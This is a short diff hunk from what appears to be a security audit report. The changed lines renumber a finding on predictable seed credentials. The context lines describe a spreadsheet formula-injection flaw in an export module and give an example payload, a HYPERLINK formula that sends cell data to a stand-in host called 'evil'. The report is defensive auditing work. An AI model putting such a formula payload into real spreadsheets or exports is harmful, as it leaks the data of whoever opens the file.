@@ -411,7 +411,7 @@ Every re-upload of the Account Master sheet **resets every listed user's passwor
 
 `services/exports.ts:92-126` writes `legalName`, `notes`, `contactPerson` directly into Excel cells. None are prefix-escaped against `=`, `+`, `-`, `@`, tab, CR. A malicious customer-name like `=HYPERLINK("http://evil/?x="&A1)` exfiltrates data on open. With Office's Protected View, exploitation requires social engineering — but the export goes to managers and goes to ERP via copy-paste.
 
-### SEC-11 — Predictable seed credentials
+### QA-022 — Predictable seed credentials
 
 Predictable seed credentials recorded in source or documentation must be treated as exposed. Confirm current account inventory and credential state privately; this public report does not establish which accounts exist, have signed in or retain an initial password.
 
